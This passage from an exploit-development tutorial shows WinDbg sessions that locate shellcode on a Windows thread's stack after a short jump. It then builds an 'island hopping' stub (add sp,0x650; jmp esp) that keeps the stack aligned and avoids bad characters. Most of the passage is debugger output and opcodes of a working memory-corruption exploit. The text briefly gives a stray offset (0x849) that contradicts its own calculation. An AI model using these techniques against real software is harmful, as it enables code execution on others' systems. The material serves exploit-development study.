</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0172ff</span><span style="color:#ae81ff">46</span> eb06            jmp     <span style="color:#ae81ff">0172ff</span><span style="color:#ae81ff">4</span>e
</span></span></code></pre></div><p>But we don&rsquo;t land on our shellcode directly:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0091ff3f</span> <span style="color:#ae81ff">41</span>              inc     ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">40</span> <span style="color:#ae81ff">41</span>              inc     ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span>              inc     ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">42</span> <span style="color:#ae81ff">41</span>              inc     ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">43</span> <span style="color:#ae81ff">41</span>              inc     ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">44</span> <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">45</span> <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">46</span> eb06            jmp     <span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">4</span>e
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">48</span> f0a215103930    lock mov byte ptr ds:[<span style="color:#ae81ff">30391015</span>h],al
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">4</span>e <span style="color:#ae81ff">3930</span>            cmp     dword ptr [eax],esi  ds:<span style="color:#ae81ff">0023</span><span style="color:#f92672">:</span><span style="color:#ae81ff">77</span>ef6252<span style="color:#f92672">=</span><span style="color:#ae81ff">0025</span><span style="color:#ae81ff">8</span>b64
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">50</span> <span style="color:#ae81ff">3930</span>            cmp     dword ptr [eax],esi
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">52</span> <span style="color:#ae81ff">3930</span>            cmp     dword ptr [eax],esi
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">54</span> <span style="color:#ae81ff">3930</span>            cmp     dword ptr [eax],esi
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">56</span> <span style="color:#ae81ff">3930</span>            cmp     dword ptr [eax],esi
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">58</span> <span style="color:#ae81ff">3930</span>            cmp     dword ptr [eax],esi
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">5</span>a <span style="color:#ae81ff">3930</span>            cmp     dword ptr [eax],esi
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">5</span>c <span style="color:#ae81ff">3930</span>            cmp     dword ptr [eax],esi
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">5</span>e <span style="color:#ae81ff">3930</span>            cmp     dword ptr [eax],esi
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">60</span> <span style="color:#ae81ff">3930</span>            cmp     dword ptr [eax],esi
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">62</span> <span style="color:#ae81ff">3930</span>            cmp     dword ptr [eax],esi
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">64</span> <span style="color:#ae81ff">3930</span>            cmp     dword ptr [eax],esi
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">66</span> <span style="color:#ae81ff">3930</span>            cmp     dword ptr [eax],esi
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">68</span> <span style="color:#ae81ff">3930</span>            cmp     dword ptr [eax],esi
</span></span></code></pre></div><p>But we know how to jump to it!
Now, let&rsquo;s search our shellcode.
<strong>The TEB has two fields that indicate us the top and the bottom of the stack. These are the StackBase and StackLimit:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">007</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">!</span>teb
</span></span><span style="display:flex;"><span>TEB at <span style="color:#ae81ff">003</span><span style="color:#ae81ff">87000</span>
</span></span><span style="display:flex;"><span>    ExceptionList:        <span style="color:#ae81ff">0091f</span><span style="color:#ae81ff">454</span>
</span></span><span style="display:flex;"><span>    StackBase:            <span style="color:#ae81ff">01</span><span style="color:#ae81ff">900000</span>
</span></span><span style="display:flex;"><span>    StackLimit:           <span style="color:#ae81ff">018f</span>e000
</span></span><span style="display:flex;"><span>    SubSystemTib:         <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    FiberData:            <span style="color:#ae81ff">00001e00</span>
</span></span><span style="display:flex;"><span>    ArbitraryUserPointer: <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    Self:                 <span style="color:#ae81ff">003</span><span style="color:#ae81ff">87000</span>
</span></span><span style="display:flex;"><span>    EnvironmentPointer:   <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    ClientId:             <span style="color:#ae81ff">00000</span><span style="color:#ae81ff">900</span> . <span style="color:#ae81ff">00001</span>dec
</span></span><span style="display:flex;"><span>    RpcHandle:            <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    Tls Storage:          <span style="color:#ae81ff">0063</span><span style="color:#ae81ff">9</span>cf0
</span></span><span style="display:flex;"><span>    PEB Address:          <span style="color:#ae81ff">00376000</span>
</span></span><span style="display:flex;"><span>    LastErrorValue:       <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    LastStatusValue:      c000000d
</span></span><span style="display:flex;"><span>    Count Owned Locks:    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    HardErrorMode:        <span style="color:#ae81ff">0</span>
</span></span></code></pre></div><p>So our shellcode must be in between both fields. Let&rsquo;s search for it in WinDbg with the following command:</p>
<pre tabindex="0"><code>s -b &lt;StackLimit&gt; &lt;StackBase&gt; &lt;pattern&gt;
</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">!</span>teb
</span></span><span style="display:flex;"><span>TEB at <span style="color:#ae81ff">002</span>a7000
</span></span><span style="display:flex;"><span>    ExceptionList:        <span style="color:#ae81ff">0174f</span><span style="color:#ae81ff">454</span>
</span></span><span style="display:flex;"><span>    StackBase:            <span style="color:#ae81ff">01750000</span>
</span></span><span style="display:flex;"><span>    StackLimit:           <span style="color:#ae81ff">0174e000</span>
</span></span><span style="display:flex;"><span>    SubSystemTib:         <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    FiberData:            <span style="color:#ae81ff">00001e00</span>
</span></span><span style="display:flex;"><span>    ArbitraryUserPointer: <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    Self:                 <span style="color:#ae81ff">002</span>a7000
</span></span><span style="display:flex;"><span>    EnvironmentPointer:   <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    ClientId:             <span style="color:#ae81ff">00001</span>d14 . <span style="color:#ae81ff">00001e68</span>
</span></span><span style="display:flex;"><span>    RpcHandle:            <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    Tls Storage:          <span style="color:#ae81ff">004f96f</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    PEB Address:          <span style="color:#ae81ff">002</span><span style="color:#ae81ff">9</span>c000
</span></span><span style="display:flex;"><span>    LastErrorValue:       <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    LastStatusValue:      c000000d
</span></span><span style="display:flex;"><span>    Count Owned Locks:    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    HardErrorMode:        <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> s <span style="color:#f92672">-</span>b <span style="color:#ae81ff">0174e000</span> <span style="color:#ae81ff">01750000</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> b8 c2
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174f</span>aa0  <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> b8 c2 aa b1 eb da<span style="color:#f92672">-</span>d8 d9 <span style="color:#ae81ff">74</span> <span style="color:#ae81ff">24</span> f4 <span style="color:#ae81ff">5</span>b <span style="color:#ae81ff">31</span> c9  ..........t<span style="color:#960050;background-color:#1e0010">$</span>.[<span style="color:#ae81ff">1.</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">5</span>c  <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> b8 c2 aa b1 eb da<span style="color:#f92672">-</span>d8 d9 <span style="color:#ae81ff">74</span> <span style="color:#ae81ff">24</span> f4 <span style="color:#ae81ff">5</span>b <span style="color:#ae81ff">31</span> c9  ..........t<span style="color:#960050;background-color:#1e0010">$</span>.[<span style="color:#ae81ff">1.</span>
</span></span></code></pre></div><p>There are two places where our shellcode is stored!
First place is just after the short jump:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">45</span> <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">46</span> eb06            jmp     <span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">4</span>e
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">48</span> f0a215109090    lock mov byte ptr ds:[<span style="color:#ae81ff">90901015</span>h],al
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">4</span>e <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff4f</span> <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">50</span> <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">51</span> <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">52</span> <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">53</span> <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">54</span> <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">55</span> <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">56</span> <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">57</span> <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">58</span> <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">59</span> <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">5</span>a <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">5</span>b <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">5</span>c <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">5</span>d <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">5</span>e b8c2aab1eb      mov     eax,<span style="color:#ae81ff">0</span>EBB1AAC2h <span style="color:#75715e">// START OF OUR SHELLCODE
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">63</span> 
</span></span></code></pre></div><p>The other place is at the end of the stack:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> dds <span style="color:#ae81ff">0174f</span>aa0 L60
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174f</span>aa0  c2b89090
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174f</span>aa4  daebb1aa
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174f</span>aa8  <span style="color:#ae81ff">2474</span>d9d8
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174f</span>aac  c9315bf4
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174f</span>ab0  eb8352b1
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174f</span>ab4  <span style="color:#ae81ff">0e4331</span>fc
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174f</span>ab8  <span style="color:#ae81ff">53</span>a48103
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174f</span>abc  <span style="color:#ae81ff">1151f</span><span style="color:#ae81ff">91</span>e
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174f</span>ac0  <span style="color:#ae81ff">76</span>a201e1 combase<span style="color:#f92672">!</span>mega__MIDL_TypeFormatString<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1561</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174f</span>ac4  b693e46b
</span></span></code></pre></div><p>BUT ONE IMPORTANT THING! If we take a look at both places, we can see that the place near the short jump does not have all the shellcode but only a part. Indeed, if we perform a search <strong>of the last bytes of the shellcode, we find that they are only present in 1 place:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> s <span style="color:#f92672">-</span>b <span style="color:#ae81ff">0174e000</span> <span style="color:#ae81ff">01750000</span> e4 ae <span style="color:#ae81ff">6f</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174f</span>bfe  e4 ae <span style="color:#ae81ff">6f</span> <span style="color:#ae81ff">31</span> bc <span style="color:#ae81ff">77</span> <span style="color:#ae81ff">8</span>a <span style="color:#ae81ff">8</span>c<span style="color:#f92672">-</span>ef <span style="color:#ae81ff">3</span>d <span style="color:#ae81ff">00</span> c0 <span style="color:#ae81ff">29</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>  ..o1.w...<span style="color:#f92672">=</span>..)...
</span></span></code></pre></div><p>So, we have to jump to the other place where the complete shellcode is stored.</p>
<p>Combined with the short jump, we are going to do a technique called &ldquo;island hopping&rdquo;.
Island hopping consists in:</p>
<ul>
<li>We have an address which we want to jump.</li>
<li>We calculate the OFFSET from the stack pointer to such address.</li>
<li>In order to reach our shellcode, the stack pointer will have to be added that offset.</li>
<li>Point the stack pointer to our shellcode by adding such offset that we calculated!</li>
<li>Perform a JMP ESP to jump to the stack pointer, which is pointing at our shellcode.</li>
</ul>
<p>To calculate the offset, first we put EIP after the short jump. Then, we calculate the offset of our shellcode to the ESP:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> s <span style="color:#f92672">-</span>b <span style="color:#ae81ff">0080e000</span> <span style="color:#ae81ff">00</span><span style="color:#ae81ff">810000</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> b8 c2
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0080f</span>a92  <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span><span style="color:#f92672">-</span><span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span>  ................
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0080ff</span><span style="color:#ae81ff">4</span>e  <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span><span style="color:#f92672">-</span><span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span>  ................
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> s <span style="color:#f92672">-</span>b <span style="color:#ae81ff">0080e000</span> <span style="color:#ae81ff">00</span><span style="color:#ae81ff">810000</span> e4 ae <span style="color:#ae81ff">6f</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0080f</span>bfe  e4 ae <span style="color:#ae81ff">6f</span> <span style="color:#ae81ff">31</span> bc <span style="color:#ae81ff">77</span> e7 e4<span style="color:#f92672">-</span><span style="color:#ae81ff">38</span> b3 <span style="color:#ae81ff">00</span> e0 <span style="color:#ae81ff">39</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>  ..o1.w.<span style="color:#ae81ff">.8</span>..<span style="color:#ae81ff">.9</span>...
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">?</span> <span style="color:#ae81ff">0080f</span>a92 <span style="color:#f92672">-</span> esp
</span></span><span style="display:flex;"><span>Evaluate expression: <span style="color:#ae81ff">1606</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">00000646</span>
</span></span></code></pre></div><p><strong>Note: this offset MIGHT NOT BE CONSISTENT between application resets or devices. If the offset changes slightly each time we launch our exploit, we must put a bigger NOP sled prior to our shellcode! So always put NOPs if you have space!</strong></p>
<p>Now, we have to add 0x849 (always in hex) to ESP.
Let&rsquo;s forge the command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf-nasm_shell 
</span></span><span style="display:flex;"><span>nasm &gt; add esp, 0x646
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  81C446060000      add esp,0x646
</span></span><span style="display:flex;"><span>nasm &gt; add esp, <span style="color:#ae81ff">1606</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  81C446060000      add esp,0x646  
</span></span><span style="display:flex;"><span>nasm &gt; jmp esp
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  FFE4              jmp esp
</span></span></code></pre></div><p>Very big note!
With this jump, the stack won&rsquo;t be aligned. <strong>The stack must be aligned in a multiple of 16 bytes.</strong>
What we are doing by adding 1606 bytes to ESP is <strong>unalign it, as 1606 is not a multiple of 16.</strong>
We will turn from an aligned stack to an unaligned one.
Indeed, if we don&rsquo;t align the stack we won&rsquo;t land on our NOPs and shellcode. Look where we will land:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> dds <span style="color:#ae81ff">0179f</span>a92
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0179f</span>a92  <span style="color:#ae81ff">46</span>c48166
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0179f</span>a96  <span style="color:#ae81ff">90e4</span>ff06
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0179f</span>a9a  <span style="color:#ae81ff">90909090</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0179f</span>a9e  <span style="color:#ae81ff">90909090</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0179f</span>aa2  <span style="color:#ae81ff">90909090</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0179f</span>aa6  b8909090
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0179f</span>aaa  ebb1aac2
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0179f</span>aae  <span style="color:#ae81ff">74</span>d9d8da
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0179f</span>ab2  <span style="color:#ae81ff">315</span>bf424
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0179f</span>ab6  <span style="color:#ae81ff">8352</span>b1c9
</span></span></code></pre></div><p>To fix that, we will add 1616 bytes instead of 1606, which is a multiple of 16 bytes, to keep the stack aligned.
In compensation, we can add some NOPs if we think that the extra bytes are going to make us not landing on our shellcode.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>nasm <span style="color:#f92672">&gt;</span> add esp, <span style="color:#ae81ff">1616</span>                                                                    
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  <span style="color:#ae81ff">81</span>C450060000      add esp,<span style="color:#ae81ff">0x650</span> 
</span></span></code></pre></div><p><strong>Note: check that this instruction does not includes BADCHARS!</strong>
If it does, a good tip is to substitute the add esp instruction, which uses all the 32 bits of the register, to add sp, which only uses the 16 least significant bits. This would change the instruction and might not contain badchars!
Our add esp instruction contains badchars, as it has two &ldquo;00&quot;s at the end that are neccesary as we are leading with instructions on top of each other.
So, let&rsquo;s try add sp, and our value:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>nasm <span style="color:#f92672">&gt;</span> add sp, <span style="color:#ae81ff">0x650</span>                                                                    
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  <span style="color:#ae81ff">6681</span>C45006        add sp,<span style="color:#ae81ff">0x650</span>
</span></span></code></pre></div><p>After checking if this had badchars, it does not.
There are two &ldquo;zeros&rdquo; in a row but each zero is from a different byte (50 - 06).
We can still jump to ESP and not SP as this will add the lower bytes into ESP.</p>
<p>Once we insert such payload, we can see that after the short jump we perform the island hopping:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0170ff</span><span style="color:#ae81ff">44</span> <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0170ff</span><span style="color:#ae81ff">45</span> <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0170ff</span><span style="color:#ae81ff">46</span> eb06            jmp     <span style="color:#ae81ff">0170ff</span><span style="color:#ae81ff">4</span>e
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0170ff</span><span style="color:#ae81ff">48</span> f0a215109090    lock mov byte ptr ds:[<span style="color:#ae81ff">90901015</span>h],al
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0170ff</span><span style="color:#ae81ff">4</span>e <span style="color:#ae81ff">6681</span>c45006      add     sp,<span style="color:#ae81ff">650</span>h
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0170ff</span><span style="color:#ae81ff">53</span> ffe4            jmp     esp {<span style="color:#ae81ff">0170f</span>a9c}
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0170ff</span><span style="color:#ae81ff">55</span> <span style="color:#ae81ff">90</span>              nop
</span></span></code></pre></div><p>If we inspect ESP, we see that all our shellcode is there and we land exactly there:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">77</span>c36252 ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">0170f</span><span style="color:#ae81ff">540</span> ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">1015</span>a2f0 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77</span>c36270 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">0170ff</span><span style="color:#ae81ff">4</span>e esp<span style="color:#f92672">=</span><span style="color:#ae81ff">0170f</span><span style="color:#ae81ff">44</span>c ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">0170f</span><span style="color:#ae81ff">460</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0170ff</span><span style="color:#ae81ff">4</span>e <span style="color:#ae81ff">6681</span>c45006      add     sp,<span style="color:#ae81ff">650</span>h
